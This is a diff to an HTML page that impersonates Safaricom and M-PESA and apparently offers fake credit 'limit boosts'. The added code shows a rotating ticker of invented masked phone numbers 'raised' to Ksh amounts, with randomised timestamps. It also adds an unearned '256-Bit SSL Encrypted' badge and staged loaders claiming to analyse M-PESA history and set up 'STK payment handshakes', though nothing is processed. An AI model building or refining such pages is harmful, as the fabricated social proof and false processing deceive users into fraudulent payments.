@@ -56,6 +56,20 @@
 </head>
 <body class="bg-gray-50 text-gray-900 flex flex-col min-h-screen relative overflow-x-hidden">
 
+  <!-- Live Ticker Banner -->
+  <div class="bg-safaricom text-white py-2 px-4 text-xs sm:text-sm">
+    <div class="max-w-7xl mx-auto flex justify-between items-center overflow-hidden">
+      <div id="live-ticker" class="flex items-center space-x-2 animate-pulse">
+        <span class="bg-white/20 p-1 rounded-full"><i data-lucide="check-circle" class="w-3.5 h-3.5"></i></span>
+        <span id="ticker-text" class="font-medium">076634***17 successfully raised to Ksh 41,450 (30 secs ago)</span>
+      </div>
+      <div class="hidden md:flex items-center space-x-4 text-xs">
+        <span class="font-bold text-safaricom-accent">Twaweza • When we come together, great things happen</span>
+        <span class="flex items-center space-x-1"><i data-lucide="lock" class="w-3 h-3"></i> <span>256-Bit SSL Encrypted</span></span>
+      </div>
+    </div>
+  </div>
+
   <!-- Header Nav -->
   <header class="bg-white shadow-sm border-b border-gray-100 sticky top-0 z-40">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
@@ -102,10 +116,10 @@
     </div>
   </header>
 
-  <!-- Top-right Toast Notification Container -->
+  <!-- Notification Container -->
   <div id="notification-toast-container" class="fixed top-24 right-6 z-50 pointer-events-none flex flex-col space-y-2 max-w-xs sm:max-w-sm w-full"></div>
 
-  <!-- Processing Loading Modal (Zuri Safaricom Cycle) -->
+  <!-- Processing Loading Modal -->
   <div id="processing-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-gray-900/70 backdrop-blur-md p-4">
     <div class="bg-white rounded-3xl p-8 max-w-md w-full shadow-2xl text-center space-y-6 relative border border-safaricom/20">
       <div class="relative w-20 h-20 mx-auto">
@@ -247,6 +261,21 @@
           </div>
         </div>
 
+        <!-- Inline Loader 1 -->
+        <div id="loader-1" class="hidden text-center py-16 max-w-md mx-auto">
+          <div class="bg-white p-8 rounded-3xl shadow-2xl border border-gray-100 space-y-6">
+            <div class="relative w-20 h-20 mx-auto flex items-center justify-center">
+              <div class="absolute inset-0 rounded-full border-4 border-safaricom/20 border-t-safaricom animate-spin"></div>
+              <i data-lucide="cpu" class="w-8 h-8 text-safaricom"></i>
+            </div>
+            <div>
+              <h3 class="text-xl font-bold text-gray-900">Zuri Scoring Analysis</h3>
+              <p class="text-xs text-safaricom font-bold mt-1" id="loader-1-text">Cross-referencing M-PESA line history...</p>
+            </div>
+            <p class="text-xs text-gray-500">Evaluating transaction velocity, repayment history, and account longevity to establish eligibility.</p>
+          </div>
+        </div>
+
         <!-- Step 2: Target Limit Selection -->
         <div id="step-2" class="hidden max-w-4xl mx-auto space-y-8">
           <div class="bg-white rounded-2xl p-6 shadow-md border-l-4 border-safaricom flex flex-wrap justify-between items-center gap-4">
@@ -355,6 +384,21 @@
               <i data-lucide="arrow-right" class="w-5 h-5 relative z-10 group-hover:translate-x-1 transition-transform"></i>
               <div class="absolute inset-0 w-1/2 h-full bg-white/20 skew-x-12 -translate-x-full animate-shimmer"></div>
             </button>
+          </div>
+        </div>
+
+        <!-- Inline Loader 2 -->
+        <div id="loader-2" class="hidden text-center py-16 max-w-md mx-auto">
+          <div class="bg-white p-8 rounded-3xl shadow-2xl border border-gray-100 space-y-6">
+            <div class="relative w-20 h-20 mx-auto flex items-center justify-center">
+              <div class="absolute inset-0 rounded-full border-4 border-safaricom/20 border-t-safaricom animate-spin"></div>
+              <i data-lucide="refresh-cw" class="w-8 h-8 text-safaricom"></i>
+            </div>
+            <div>
+              <h3 class="text-xl font-bold text-gray-900">Processing Allocation</h3>
+              <p class="text-xs text-safaricom font-bold mt-1" id="loader-2-text">Staging tier configuration...</p>
+            </div>
+            <p class="text-xs text-gray-500">Securing server clearance and establishing direct STK payment handshakes.</p>
           </div>
         </div>
 
@@ -605,6 +649,21 @@
       icon.classList.toggle('rotate-180');
     }
 
+    const updates = [
+      "0722***412 successfully raised to Ksh 28,500",
+      "0715***890 successfully raised to Ksh 15,000",
+      "0766***317 successfully raised to Ksh 41,450",
+      "0701***554 successfully raised to Ksh 35,000"
+    ];
+    let tickerIdx = 0;
+    setInterval(() => {
+      const tickerText = document.getElementById('ticker-text');
+      if (tickerText) {
+        tickerIdx = (tickerIdx + 1) % updates.length;
+        tickerText.textContent = `${updates[tickerIdx]} (${Math.floor(Math.random() * 50 + 10)} secs ago)`;
+      }
+    }, 4000);
+
     const notificationQueue = [
       { name: "0712***941", action: "Limit Boosted to Ksh 15,000", time: "Just now" },
       { name: "0724***102", action: "Limit Boosted to Ksh 8,000", time: "1 min ago" },
@@ -655,7 +714,6 @@
       return digits;
     }
 
-    // 6-Second Zuri Safaricom Processing Cycle Modal Handler
     function runProcessingCycle(statusMessage, callback) {
       const modal = document.getElementById('processing-modal');
       const progressBar = document.getElementById('processing-progress-bar');
